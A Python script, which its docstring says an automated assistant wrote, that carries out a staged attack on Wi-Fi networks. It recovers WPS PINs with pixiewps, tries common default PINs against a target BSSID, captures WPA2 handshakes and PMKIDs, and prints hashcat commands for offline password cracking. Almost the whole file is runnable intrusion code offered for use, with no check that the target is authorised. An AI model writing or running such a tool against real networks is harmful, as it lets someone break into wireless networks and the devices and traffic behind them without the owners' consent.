#!/usr/bin/env python3
"""
enhanced_wps_attack.py

Standalone runnable script that integrates pixiewps fallback and offline capture
workflows into FARHAN-Shot as a separate tool. Creates multiple fallback stages:
  - pixiewps --force (when crypto material present)
  - quick common-PIN trial
  - WPA2 handshake capture (airodump-ng)
  - PMKID extraction (hcxdumptool)

Usage: python3 enhanced_wps_attack.py <BSSID> [--interface wlan0mon] [--channel 6]

This file was generated and added to the repository by an automated assistant to
provide a separate, runnable integration script.
"""

from __future__ import annotations
import argparse
import subprocess
import json
import re
import time
import os
from datetime import datetime
from pathlib import Path


class WPSAttackHandler:
    """Handles WPS attacks with comprehensive fallback mechanisms"""

    COMMON_PINS = [
        "12345670", "00000000", "11111111", "12341234",
        "88888888", "19283746", "99999999", "11223344"
    ]

    def __init__(self, interface: str = "wlan0mon", verbose: bool = True):
        self.interface = interface
        self.verbose = verbose
        self.results = {}

    def log(self, level: str, msg: str) -> None:
        """Unified logging"""
        if self.verbose or level in ("SUCCESS", "ERROR"):
            timestamp = datetime.now().strftime("%H:%M:%S")
            symbols = {
                "INFO": "[i]",
                "SUCCESS": "[+]",
                "ERROR": "[-]",
                "WARN": "[!]",
                "DEBUG": "[*]"
            }
            print(f"{symbols.get(level, '[*]')} [{timestamp}] {msg}")

    def run_pixiewps_with_force(self, pke: str, pkr: str, e_hash1: str, e_hash2: str, authkey: str, e_nonce: str, timeout: int = 60):
        """Run pixiewps with --force flag for aggressive extraction"""
        self.log("INFO", "Attempting pixiewps with --force flag...")

        cmd = [
            "pixiewps",
            "--pke", pke,
            "--pkr", pkr,
            "--e-hash1", e_hash1,
            "--e-hash2", e_hash2,
            "--authkey", authkey,
            "--e-nonce", e_nonce,
            "--force",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            output = (result.stdout or "") + (result.stderr or "")

            # Parse PIN from output (several known output formats)
            pin_match = re.search(r"(?:WPS pin|WPS PIN|Pin)[:\s]+['\"]?([0-9]{8})['\"]?", output, re.IGNORECASE)
            if pin_match:
                pin = pin_match.group(1)
                self.log("SUCCESS", f"PIN found with --force: {pin}")
                return {"pin": pin, "method": "pixiewps_force", "output": output}

            # Some pixiewps variants print "WPS PIN: 12345670" or "+ PIN: 12345670"
            m2 = re.search(r"\b(\d{8})\b", output)
            if m2:
                candidate = m2.group(1)
                # verify checksum (last digit) for 8-digit WPS PIN
                body = int(candidate[:7])
                cs = self._wps_checksum(body)
                if int(candidate[7]) == cs:
                    self.log("SUCCESS", f"PIN found (heuristic): {candidate}")
                    return {"pin": candidate, "method": "pixiewps_force", "output": output}

            self.log("DEBUG", f"pixiewps output (truncated):\n{output[:800]}")
            return None
        except subprocess.TimeoutExpired:
            self.log("WARN", "pixiewps with --force timed out")
            return None
        except FileNotFoundError:
            self.log("ERROR", "pixiewps binary not found. Install pixiewps or pixiewps-extend.")
            return None
        except Exception as e:
            self.log("ERROR", f"pixiewps execution failed: {e}")
            return None

    @staticmethod
    def _wps_checksum(pin7: int) -> int:
        accum = 0
        p = pin7
        while p:
            accum += 3 * (p % 10)
            p //= 10
            accum += p % 10
            p //= 10
        return (10 - accum % 10) % 10

    def test_common_pins(self, bssid: str, essid: str) -> dict | None:
        """Test common default WPS PINs"""
        self.log("INFO", "Testing common WPS PINs...")

        for i, pin in enumerate(self.COMMON_PINS, 1):
            self.log("INFO", f"[{i}/{len(self.COMMON_PINS)}] Testing PIN: {pin}")
            if self.try_wps_pin(bssid, pin):
                self.log("SUCCESS", f"PIN accepted: {pin}")
                return {"pin": pin, "method": "common_pin_bruteforce"}
            time.sleep(1)

        self.log("WARN", "None of the common PINs worked")
        return None

    def try_wps_pin(self, bssid: str, pin: str) -> bool:
        """Test if a WPS PIN is valid using wpa_cli."""
        try:
            cmd = ["wpa_cli", "-i", self.interface, "wps_reg", bssid, pin]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            out = (result.stdout or "") + (result.stderr or "")
            if result.returncode == 0 and ("OK" in out or "SUCCESS" in out.upper() or "WPS-SUCCESS" in out):
                return True
            # Some implementations reply with "FAIL" but then produce a PSK; we avoid that complexity here
            return False
        except FileNotFoundError:
            self.log("ERROR", "wpa_cli not found. Install wpa_supplicant/wpa_cli.")
            return False
        except Exception:
            return False

    def capture_handshake(self, bssid: str, essid: str, channel: int, timeout: int = 25) -> dict | None:
        """Capture WPA2 handshake for offline cracking using airodump-ng."""
        self.log("INFO", f"Capturing WPA2 handshake for {essid} on channel {channel}...")

        safe_essid = re.sub(r"[^A-Za-z0-9_-]", "_", essid)[:32]
        base = f"/tmp/{safe_essid}_{bssid.replace(':', '')}"

        try:
            cmd = [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", str(channel),
                "-w", base,
                self.interface
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.log("DEBUG", f"Capturing for {timeout} seconds...")
            time.sleep(timeout)
            proc.terminate()
            time.sleep(0.5)

            cap_file = f"{base}-01.cap"
            if os.path.exists(cap_file):
                self.log("SUCCESS", f"Handshake captured: {cap_file}")
                return {"handshake": cap_file, "method": "wpa2_handshake", "note": f"Use: hashcat -m 22000 {cap_file} wordlist.txt"}
            else:
                self.log("WARN", "Handshake capture failed or pcap not created")
                return None
        except FileNotFoundError:
            self.log("ERROR", "airodump-ng not found. Install aircrack-ng suite.")
            return None
        except Exception as e:
            self.log("ERROR", f"Handshake capture error: {e}")
            return None

    def extract_pmkid(self, bssid: str, essid: str, timeout: int = 15) -> dict | None:
        """Extract PMKID using hcxdumptool (if available)."""
        self.log("INFO", "Attempting PMKID extraction...")
        safe = bssid.replace(":", "")
        outpath = f"/tmp/pmkid_{safe}.pcap"

        try:
            cmd = [
                "hcxdumptool",
                "-i", self.interface,
                "-o", outpath,
                "--enable_status=3",
                "--filterlist_ap=",  # no filterlist
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.log("DEBUG", f"Extracting for {timeout} seconds...")
            time.sleep(timeout)
            proc.terminate()
            time.sleep(0.5)
            if os.path.exists(outpath) and os.path.getsize(outpath) > 100:
                self.log("SUCCESS", f"PMKID extracted: {outpath}")
                return {"pmkid": outpath, "method": "pmkid_offline", "note": f"Use: hashcat -m 16800 {outpath} wordlist.txt"}
            else:
                self.log("WARN", "PMKID extraction failed or output empty")
                return None
        except FileNotFoundError:
            self.log("WARN", "hcxdumptool not found. Install hcxdumptool to extract PMKID.")
            return None
        except Exception as e:
            self.log("ERROR", f"PMKID extraction error: {e}")
            return None

    def comprehensive_attack(self, bssid: str, essid: str, pke: str | None = None, pkr: str | None = None,
                             e_hash1: str | None = None, e_hash2: str | None = None,
                             authkey: str | None = None, e_nonce: str | None = None,
                             channel: int = 6) -> dict:
        """Execute comprehensive WPS attack with multiple fallbacks"""
        self.log("INFO", "=" * 60)
        self.log("INFO", f"Starting comprehensive WPS attack on {essid} ({bssid})")
        self.log("INFO", "=" * 60)

        result = {
            "bssid": bssid,
            "essid": essid,
            "success": False,
            "pin": None,
            "method": None,
            "handshake": None,
            "pmkid": None,
            "alternatives": []
        }

        # Stage 1: Pixiewps with --force when we have the crypto fields
        if pke and pkr and e_hash1 and e_hash2 and authkey and e_nonce:
            self.log("INFO", "Stage 1: pixiewps (forced)")
            pix_result = self.run_pixiewps_with_force(pke, pkr, e_hash1, e_hash2, authkey, e_nonce)
            if pix_result and pix_result.get("pin"):
                result.update({"pin": pix_result["pin"], "method": pix_result.get("method", "pixiewps_force"), "success": True})
                return result

        # Stage 2: Common PIN brute-force
        self.log("INFO", "Stage 2: Common PIN brute-force")
        pin_result = self.test_common_pins(bssid, essid)
        if pin_result and pin_result.get("pin"):
            result.update({"pin": pin_result["pin"], "method": pin_result.get("method"), "success": True})
            return result

        # Stage 3: Handshake capture for offline cracking
        self.log("INFO", "Stage 3: WPA2 Handshake capture")
        hs_result = self.capture_handshake(bssid, essid, channel, timeout=25)
        if hs_result:
            result["handshake"] = hs_result["handshake"]
            result["alternatives"].append(hs_result)
            self.log("SUCCESS", f"Handshake captured - use offline cracking: {hs_result.get('handshake')}")

        # Stage 4: PMKID extraction
        self.log("INFO", "Stage 4: PMKID extraction")
        pmkid_result = self.extract_pmkid(bssid, essid, timeout=15)
        if pmkid_result:
            result["pmkid"] = pmkid_result["pmkid"]
            result["alternatives"].append(pmkid_result)
            self.log("SUCCESS", f"PMKID extracted - use offline cracking: {pmkid_result.get('pmkid')}")

        # Summary
        if result["success"]:
            self.log("SUCCESS", "PIN successfully obtained!")
        else:
            if result["alternatives"]:
                self.log("WARN", f"PIN not found, but captured {len(result['alternatives'])} offline cracking option(s)")
                for alt in result["alternatives"]:
                    self.log("INFO", f"  - {alt.get('note', 'N/A')}")
            else:
                self.log("ERROR", "All attack stages failed - target may be invulnerable or out of range")

        return result


def main():
    parser = argparse.ArgumentParser(description="Enhanced WPS attack helper (pixiewps fallback + offline capture)")
    parser.add_argument("bssid", help="Target BSSID (MAC address)")
    parser.add_argument("-i", "--interface", default="wlan0mon", help="Wireless interface (default: wlan0mon)")
    parser.add_argument("-e", "--essid", default="Target", help="Network ESSID")
    parser.add_argument("-c", "--channel", type=int, default=6, help="Wireless channel (default: 6)")
    parser.add_argument("--pke", help="PKE hex string (pixiewps)" )
    parser.add_argument("--pkr", help="PKR hex string (pixiewps)" )
    parser.add_argument("--e_hash1", help="E-Hash1 hex string (pixiewps)" )
    parser.add_argument("--e_hash2", help="E-Hash2 hex string (pixiewps)" )
    parser.add_argument("--authkey", help="AuthKey hex string (pixiewps)" )
    parser.add_argument("--e_nonce", help="E-Nonce hex string (pixiewps)" )
    parser.add_argument("--quiet", action="store_true", help="Quiet mode: minimal output")

    args = parser.parse_args()

    # Basic validation
    if len(args.bssid) != 17 or args.bssid.count(":") != 5:
        print("[-] Invalid BSSID format. Use: XX:XX:XX:XX:XX:XX")
        raise SystemExit(1)

    handler = WPSAttackHandler(interface=args.interface, verbose=not args.quiet)

    result = handler.comprehensive_attack(
        bssid=args.bssid,
        essid=args.essid,
        pke=args.pke,
        pkr=args.pkr,
        e_hash1=args.e_hash1,
        e_hash2=args.e_hash2,
        authkey=args.authkey,
        e_nonce=args.e_nonce,
        channel=args.channel
    )

    print("\n=== ATTACK RESULTS ===")
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
